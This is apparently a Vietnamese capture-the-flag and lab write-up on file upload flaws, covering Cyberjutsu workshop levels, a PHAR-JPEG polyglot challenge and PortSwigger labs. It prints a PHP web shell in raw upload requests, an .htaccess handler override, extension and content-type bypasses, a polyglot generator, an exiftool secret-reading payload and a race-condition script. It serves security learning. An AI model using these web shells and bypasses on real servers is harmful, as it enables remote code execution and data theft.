---
title: "Upload file"
excerpt: "January 14, 2023 04:00 PM ICT to January 14, 2023 04:00 PM ICT"

header:
show_date: true
header:
  teaser: "../assets/images/images-icon/uploadfile.jpg"
  teaser_home_page: true
  icon: "https://hackmd.io/_uploads/By3gJwG0h.png"
categories:
  - CTF
tags:
  - CTF
  - Vietnamese
---

<p align="center">
<img src="https://l3mnt2010.github.io/assets/images/images-icon/uploadfile.jpg" alt="">
</p>

# upload file lab

# File upload workshop

## Level 1

![image](https://hackmd.io/_uploads/r1cYqHG0C.png)

Khá là đơn giản upload .php và rce

```
POST / HTTP/1.1
Host: fileupload.cyberjutsu-lab.tech:12001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------37657068791581678554348798897
Content-Length: 263
Origin: http://fileupload.cyberjutsu-lab.tech:12001
Connection: close
Referer: http://fileupload.cyberjutsu-lab.tech:12001/
Cookie: PHPSESSID=990aa20314db28af348183883f33a9fd
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------37657068791581678554348798897
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/octet-stream

<?php system($_GET['cmd']);?>

-----------------------------37657068791581678554348798897--

```


![image](https://hackmd.io/_uploads/rkbvoBf0R.png)


![image](https://hackmd.io/_uploads/HkyOjSGA0.png)


![image](https://hackmd.io/_uploads/HJStoSMCC.png)


flag: `CBJS{why-php-run-what?}`

## Level 2

bài này mức độ nhỉnh hơn có vẻ là black-list một vài file rồi, đầu tiên thử thay content-type nhưng không được:

![image](https://hackmd.io/_uploads/SyC0jHfCC.png)

quan sát version của php là `PHP/7.3.33`

có thể bị null byte ở đuôi file -> ta thử upload các ảnh thì được -> thử bypass với null byte hoặc php3

upload thành công như có vẻ không được:

![image](https://hackmd.io/_uploads/rkc63HzCA.png)

Tiếp theo thử pathtraversal thử xem vì khi upload file php lên nó detect:

Sau một hồi vật lộn mình tìm ra `file.png.php` sẽ bypass được có vẻ như nó sẽ split sau dấu . và check

![image](https://hackmd.io/_uploads/r1xexfIGCA.png)


-> đọc flag thôi

![image](https://hackmd.io/_uploads/H1sZfIfRR.png)

![image](https://hackmd.io/_uploads/ByJVf8fAC.png)

flag: `CBJS{wr0nGlY_ImplEm3nt}`


## Level 3

Mới vào thì ta thử luôn cái của level 2 nhưng chắc chắn đã bị black-list

Sau một hồi bypass vật lộn từ .htaccess qua .php -> mình tìm ra extendsion .phar của php sẽ có thể bypass được(thực ra là mấy cái đó bypass được nhưng server không hiểu nó là file php để có thực thi):

![image](https://hackmd.io/_uploads/Hyi348zCR.png)

![image](https://hackmd.io/_uploads/rkDoNUfR0.png)

![image](https://hackmd.io/_uploads/Sy-UHLfAR.png)

flag: `CBJS{bl4ck_list?}`


```
<?php
// error_reporting(0);

// Create folder for each user
session_start();
if (!isset($_SESSION['dir'])) {
    $_SESSION['dir'] = 'upload/' . session_id();
}
$dir = $_SESSION['dir'];
if (!file_exists($dir))
    mkdir($dir);

if (isset($_GET["debug"])) die(highlight_file(__FILE__));
if (isset($_FILES["file"])) {
    $error = '';
    $success = '';
    try {
        $filename = $_FILES["file"]["name"];
        $extension = end(explode(".", $filename));
        if ($extension === "php") {
            die("Hack detected");
        }
        $file = $dir . "/" . $filename;
        move_uploaded_file($_FILES["file"]["tmp_name"], $file);
        $success = 'Successfully uploaded file at: <a href="/' . $file . '">/' . $file . ' </a><br>';
        $success .= 'View all uploaded file at: <a href="/' . $dir . '/">/' . $dir . ' </a>';
    } catch (Exception $e) {
        $error = $e->getMessage();
    }
}
?>
```

đây là source của nó


## Level 4


Vào cái mình thử mấy cái trên thì filter hết -> trong đầu mình hướng đến .htaccess từ lâu lắm rồi -> thử cái ăn luôn:

```
POST / HTTP/1.1
Host: fileupload.cyberjutsu-lab.tech:12004
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------19884319738814097911798630641
Content-Length: 297
Origin: http://fileupload.cyberjutsu-lab.tech:12004
Connection: close
Referer: http://fileupload.cyberjutsu-lab.tech:12004/
Cookie: PHPSESSID=990aa20314db28af348183883f33a9fd
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------19884319738814097911798630641
Content-Disposition: form-data; name="file"; filename=".htaccess"
Content-Type: image/jpeg

<FilesMatch "\.txt$">
    SetHandler application/x-httpd-php
</FilesMatch>

-----------------------------19884319738814097911798630641--

```

Up một file .htaccess cho phép file txt thực thi như php ->

![image](https://hackmd.io/_uploads/BkGRUIM0C.png)


Sau đó up file txt và nhận shell

![image](https://hackmd.io/_uploads/rk6yP8GA0.png)

![image](https://hackmd.io/_uploads/SykWwIMRA.png)

![image](https://hackmd.io/_uploads/HJ4GwLf0C.png)


flag: `CBJS{so_magic_I_wondeR_what_about_other_system?}`

```
<?php
// error_reporting(0);

// Create folder for each user
session_start();
if (!isset($_SESSION['dir'])) {
    $_SESSION['dir'] = 'upload/' . session_id();
}
$dir = $_SESSION['dir'];
if (!file_exists($dir))
    mkdir($dir);

if (isset($_GET["debug"])) die(highlight_file(__FILE__));
if (isset($_FILES["file"])) {
    $error = '';
    $success = '';
    try {
        $filename = $_FILES["file"]["name"];
        $extension = end(explode(".", $filename));
        if (in_array($extension, ["php", "phtml", "phar"])) {
            die("Hack detected");
        }
        $file = $dir . "/" . $filename;
        move_uploaded_file($_FILES["file"]["tmp_name"], $file);
        $success = 'Successfully uploaded file at: <a href="/' . $file . '">/' . $file . ' </a><br>';
        $success .= 'View all uploaded file at: <a href="/' . $dir . '/">/' . $dir . ' </a>';
    } catch (Exception $e) {
        $error = $e->getMessage();
    }
}
?>
```
đây là source của nó như ta thấy thì nó chặn 3 extendsion ở trên và phar của level3


## Level 5

ở đây tác giả có 1 hint

![image](https://hackmd.io/_uploads/rkoqwIMRR.png)

Nên mình sẽ hướng đến hướng là polygot vì khả năng cao là tác giả sẽ check mimetype của file hoặc tác giả sẽ check nhưng byte đầu xem có thực sự là ảnh không

Triển khai:

làm cái ăn ngay:

![image](https://hackmd.io/_uploads/ryV8OIG0C.png)


có vẻ như chỉ check mấy byte đầu -> ta thêm php vào cuối file thêm vào đó là không filter đuôi php


![image](https://hackmd.io/_uploads/HJpTuUMCR.png)

![image](https://hackmd.io/_uploads/B1fkY8fRR.png)


flag: `CBJS{why_you_check_with_useR_input}`

đây là full source của chall này:

```
<?php
// error_reporting(0);

// Create folder for each user
session_start();
if (!isset($_SESSION['dir'])) {
    $_SESSION['dir'] = 'upload/' . session_id();
}
$dir = $_SESSION['dir'];
if (!file_exists($dir))
    mkdir($dir);

if (isset($_GET["debug"])) die(highlight_file(__FILE__));
if (isset($_FILES["file"])) {
    $error = '';
    $success = '';
    try {
        $mime_type = $_FILES["file"]["type"];
        if (!in_array($mime_type, ["image/jpeg", "image/png", "image/gif"])) {
            die("Hack detected");
        }
        $file = $dir . "/" . $_FILES["file"]["name"];
        move_uploaded_file($_FILES["file"]["tmp_name"], $file);
        $success = 'Successfully uploaded file at: <a href="/' . $file . '">/' . $file . ' </a><br>';
        $success .= 'View all uploaded file at: <a href="/' . $dir . '/">/' . $dir . ' </a>';
    } catch (Exception $e) {
        $error = $e->getMessage();
    }
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <title>PHP upload Level 5</title>

    <!-- This is for UI only -->
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.6.0/css/bootstrap.min.css" integrity="sha512-P5MgMn1jBN01asBgU0z60Qk4QxiXo86+wlFahKrsQf37c9cro517WzVSPPV1tDKzhku2iJ2FVgL67wG03SGnNA==" crossorigin="anonymous" referrerpolicy="no-referrer" />

</head>

<body>
    <br />
    <br />
    <h3 class="display-4 text-center">File upload workshop</h3>
    <h4 class="display-4 text-center">Level 5</h4>
    <p class="display-5 text-center">I think I need to check if the uploaded file is truly image or not</p>
    <p class="display-5 text-center">Goal: RCE me</p>

    <br />
    <div class="container">
        <a href="/?debug">Debug source</a><br />

        <form method="post" enctype="multipart/form-data">
            Select file to upload:
            <input type="file" name="file" id="file">
            <br />
            <input type="submit">
        </form>
        <span style="color:red"><?php echo $error; ?></span>
        <span style="color:green"><?php echo $success; ?></span>
    </div>

</body>

<footer class="container">
    <br />
    <br />
    <br />
    <button class="float-left btn btn-dark" type="button" onclick="prevLevel()">Previous level</button>
    <button class="float-right btn btn-dark" type="button" onclick="nextLevel()">Next level</button>

    <script>
        function prevLevel() {
            const url = new URL(origin);
            url.port = (parseInt(url.port) - 1).toString();
            location.href = url.toString();
        }

        function nextLevel() {
            const url = new URL(origin);
            url.port = (parseInt(url.port) + 1).toString();
            location.href = url.toString();
        }
    </script>

</footer>

</html>START </html>
```

Như đã thấy là bài này check cả content-type và ta đã đổi thành image/jpg từ đầu

Thực ra thì nó chỉ check content-type thôi -> ta đã nghĩ quá nhiều rồi:

![image](https://hackmd.io/_uploads/r1FsF8f0A.png)

![image](https://hackmd.io/_uploads/HyM3YUzAC.png)

## Level 6

Lần này thì nhanh thôi vì ta đã loại bỏ hầu hết cả trường hợp rồi -> ta up polygot -> đổi tên thành .php và content-type để bypass

![image](https://hackmd.io/_uploads/B1Bi5Lf0C.png)


![image](https://hackmd.io/_uploads/B1Gz3UzCC.png)

Thấy chèn cmd mãi mà không ăn thì ra đang để mặc định là ls /

![image](https://hackmd.io/_uploads/rkA12IGAC.png)

![image](https://hackmd.io/_uploads/BkgUX3Iz0C.png)

![image](https://hackmd.io/_uploads/H1vL3UfRC.png)

flag: `MCBJS{ch3ck_mag1c_bite_iz_tragic}`


## [File upload - Polyglot](https://)

### 1.  Statement
Your friend who is a photography fan has created a site to allow people to share their beautiful photos. He assures you that his site is secure because he checks that the file sent is a JPEG, and that it is not a disguised PHP file. Prove him wrong!

- Đầu tiên em thử upload 1 file jpg lên và thành công
#
![image](https://hackmd.io/_uploads/rJw0vhwjp.png)

- Sau đó mình sẽ có thể xem ảnh ở ~~go see it here~~.
- Sau đó em thử upload các cách như nullbyte, extendtion vẫn không được vì vậy có lẽ sever đã check thêm cả metadata
- Em đã thử thêm bằng việc upload một file polygot tạo bằng exif-tool để bypass và kết quả em nhận được là
![image](https://hackmd.io/_uploads/BJuR_hPo6.png)
### 
- Quả nhiên là sever đã check nội dung của file này.
- Sau khi tìm hiểu về file polygot thì em đã biết thêm về file phar trong php nó cũng giống như dạng file jar trong java.
- Cấu trúc của file này gồm có :

    **1**. Stubs: Là nội dung đầu tiên trong một tập tin phar. Stub chứa code PHP code sẽ được thực thi khi tập tin được truy cập. Theo đó, tập tin Phar có thể thực hiện tự giải nén thông qua Stream wrapper của PHP và stub sẽ được thực thi tại đây trong một số trường hợp. Nội dung stub cần có khai báo ít nhất gồm giá trị <? __halt_compiler().

    **2**. Manifest: Chứa các thông tin metadata quan trọng bao gồm file size, file name hoặc cũng có thể là objects được serialized.

    **3**. file content: Lưu trữ mọi thứ trong phar file như các static assets, code php hoặc library được nén trong tập tin phar, …
    **4**. Signature: Là một option trong phar files, sẽ bao gồm checksums để ngăn chặn việc các corruption trong khi load file.

- ở endpoint admin:
![image](https://hackmd.io/_uploads/H11oinvip.png)
- Khi mà ta post một tên lên thì báo:
![image](https://hackmd.io/_uploads/Bkxrhnvjp.png)
- Ta có thể đoán được ở đây sử dụng :
```
include("phar://".$_POST['phar_name']);
```
- Vì stub cho phép chúng ta thêm bất kì nội dung nào chúng ta muốn chỉ cần đảm bảo trong đó phải tồn tại giá trị __halt_compiler(); nên bằng thêm các hex bytes vào đầu stub chúng ta có thể fake hầu hết các định dạng file. Theo như ý tưởng trên, chúng ta chỉ cần chèn format hex của Jpeg vào stub, chúng ta sẽ tạo thành công một PHAR Jpeg Polygot. Quay lại với cấu trúc JPEG, một JPEG hợp lệ cần có các byte đầu tiên dạng \xFF\xD8\xFF\xFE\x13\xFA\x78\x74 (trong đó FF D8 là giá trị khai báo đây là tập tin JPEG, FF FE sẽ khai báo bắt đầu comment trong JPEG, 13 FA là nội dung comment length) khi đó, nội dung generate file phar như sau:

```
<?php
$phar = new Phar("phar.phar");
$phar->addFromString("l3m.txt","l3mnt2010");
$phar->startBuffering();
$phar->setStub("\xFF\xD8\xFF\xFE\x13\xFA\x78\x74 <?php phpinfo(); __HALT_COMPILER(); ?>");
$phar->stopBuffering();
```

- Sau đó chạy file này để gen ra file phar
![image](https://hackmd.io/_uploads/Hywk3TPoT.png)
- Rename file phar.phar vừa được generate thành phar.jpeg, tiến hành upload file này chúng ta  Tiến hành up file này lên thì vẫn bị check:

![image](https://hackmd.io/_uploads/H1JN2TDsa.png)


- Vì ứng dụng kiểm tra toàn bộ các thuộc tính có trong tập tin, nên nếu chỉ thêm \xFF\xD8\xFF\xFE\x13\xFA\x78\x74 vào đầu tập tin, trong quá trình validate các thuộc tính khác sẽ không hợp lệ, ví dụ như getimagesize().

![image](https://hackmd.io/_uploads/rk7rTTDo6.png)


- Để giải quyết vấn đề ở đây, chúng ta sẽ phải thêm toàn bộ các hex hợp lệ của một image vào stub, khi đó khi kiểm tra thuộc tính image, toàn bộ nội dung trong khoảng từ FF D8 (bắt đầu JPEG) đến FF D9 (Kết thúc Jpeg) sẽ được load để đưa ra thuộc tính của Image.
- Chúng ta sẽ tiến hành create một image và chèn toàn bộ hex của image vào stub trong phar file.

![image](https://hackmd.io/_uploads/S1lzC6vjT.png)

- Và đã bypass được
![image](https://hackmd.io/_uploads/SJx80Tvia.png)

- Tèn ten thực hiện nhập tên để wrapper phar:// tiến hành phân tích và có được kết quả
![image](https://hackmd.io/_uploads/SkYRR6vsp.png)

- bây giờ thì đi tìm flag, có một hàm rất hay trong php là scandir('.') được sử dụng để liệt kê các tệp tin và thư mục trong thư mục hiện tại (được đại diện bởi dấu chấm). Kết quả trả về là một mảng chứa tên của các tệp tin và thư mục trong thư mục đó.


- Upload nó lên 
![image](https://hackmd.io/_uploads/Hk7Ck0ws6.png)
 và thu được kết quả
![image](https://hackmd.io/_uploads/Hk7keADja.png)
- Excute nó trong enpoint admin
- Và 3 2 1 bùm
![image](https://hackmd.io/_uploads/ry7Xx0vo6.png)
- Flag nằm trong file flag-juygaz36YyTFyT6R.txt
![image](https://hackmd.io/_uploads/B1il-AwsT.png)


Flag : co lam thi moi co an


## [PortSwigger - Full upload file](https://)


### [Remote code execution via web shell upload](https://)
 ![image](https://hackmd.io/_uploads/SJGoDAvsa.png)

- Bài này chỉ cần up file php cơ bản để lấy secret của carlos để submit
- Đăng nhập với viewner thấy chức năng upload avatar
- Upload file và lấy secret
![image](https://hackmd.io/_uploads/S1iDK0vi6.png)

![image](https://hackmd.io/_uploads/SyKSKCvjT.png)

### [Web shell upload via Content-Type restriction bypass](https://)
 ![image](https://hackmd.io/_uploads/S1l6Y0vj6.png)

- Tương tự với bài trên nhưng mà sever còn check contentType nên ta cần thay đổi thành image/jpeg hoặc image/png
![image](https://hackmd.io/_uploads/SkbI9CPj6.png)
- mở file ra và nhận secret
![image](https://hackmd.io/_uploads/SkhOcCDja.png)


### [Web shell upload via path traversal](https://)
 ![image](https://hackmd.io/_uploads/ryI35Rwi6.png)
- Bài lab này cũng có yêu cầu như trên nhưng mà lúc này sever đã config trong thư mục upload không biên dịch code php cho nên chúng ta sẽ sử dụng path traversal để đưa file ra ngoài file này để heck:<
- Đây là khi ta up 1 file lên 
 ![image](https://hackmd.io/_uploads/B1VTiAwjp.png)
- Sử dụng path traversal
![image](https://hackmd.io/_uploads/rkzXnRPi6.png)
- Có vẻ như sever đã filter chúng
- nên sử dụng cách bypass sau
![image](https://hackmd.io/_uploads/BJgI3RDjp.png)
- Đã thành công nên bây giờ hãy mở file ra và lấy secret
![image](https://hackmd.io/_uploads/Bykc3Avja.png)

### [Web shell upload via extension blacklist bypass](https://)
 ![image](https://hackmd.io/_uploads/rJcbpCPo6.png)

- Bài này là sever đã config không cho phép chạy file .php
- Nên giải pháp là ghi đè file .htaccess
- Ở đây ta config file .htaccess cho phép chạy file txt như php
 ![image](https://hackmd.io/_uploads/r1gXC0wia.png)
- Và kết quả đã thành công
- Bây giờ upfile txt
 ![image](https://hackmd.io/_uploads/ryWuAADjp.png)

- mở file ra và ta có secret
 ![image](https://hackmd.io/_uploads/BJBc0RDs6.png)


### [Web shell upload via obfuscated file extension](https://)
 ![image](https://hackmd.io/_uploads/Hy_6R0Dj6.png)

- Bài này cũng có yêu cầu tương tự nhưng mà không upload được .htaccess hay file php nên ta sẽ sử dụng kĩ thuật bypass của payload all the thing là nullbyte để vượt qua blacklist này
 ![image](https://hackmd.io/_uploads/H1Hyl1uiT.png)
- Mở file ra và nhận secret
 ![image](https://hackmd.io/_uploads/BJyQxJ_sp.png)

### [Remote code execution via polyglot web shell upload](https://)
 ![image](https://hackmd.io/_uploads/HJ5Se1djp.png)

- bài này là sử dụng kĩ thuật của file polygot để chèn thêm mã php bởi vì sever check cả MIME của ảnh
- sử dụng exif-tool
- exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" hihi.jpg -o polyglot.php
 ![image](https://hackmd.io/_uploads/Bk4M-kujT.png)
- Ta có thể thấy mặc dù đuôi file là php nhưng MIME type là JPEG
 ![image](https://hackmd.io/_uploads/Sk1L-JOja.png)
- Mở file lên và nhận secret nằm giữa start và end :>
 ![image](https://hackmd.io/_uploads/SJo_by_op.png)
 
### [Web shell upload via race condition](https://)
  ![image](https://hackmd.io/_uploads/r15yG1Os6.png)

- bài này giống hệt ở bài metadata trong BKSEC mà dễ hơn xíu
- Sever check content-Type của file sau khi upload thì sẽ xóa luôn file đó bằng hàm unlink nên chúng ta sẽ RACE để lấy được dữ liệu trước khi file bị xóa

1. POC:
```
import requests
import time

url = "https://0ac900b804469fbc822c060b00ad008c.web-security-academy.net"

while True:
    file_name = "/files/avatars/" + "ex.php"
    res = requests.get(url + file_name)

    if "KCSC_l3mnt2010" in res.text:
        print("KCSC_l3mnt2010", res.text)
        break
```
2. Kết hợp với burp intruder để liên tục upload file:
 ![image](https://hackmd.io/_uploads/SJk6SyOop.png)
 
- Và kết quả nhận được
 ![image](https://hackmd.io/_uploads/SyZRSJOjp.png)
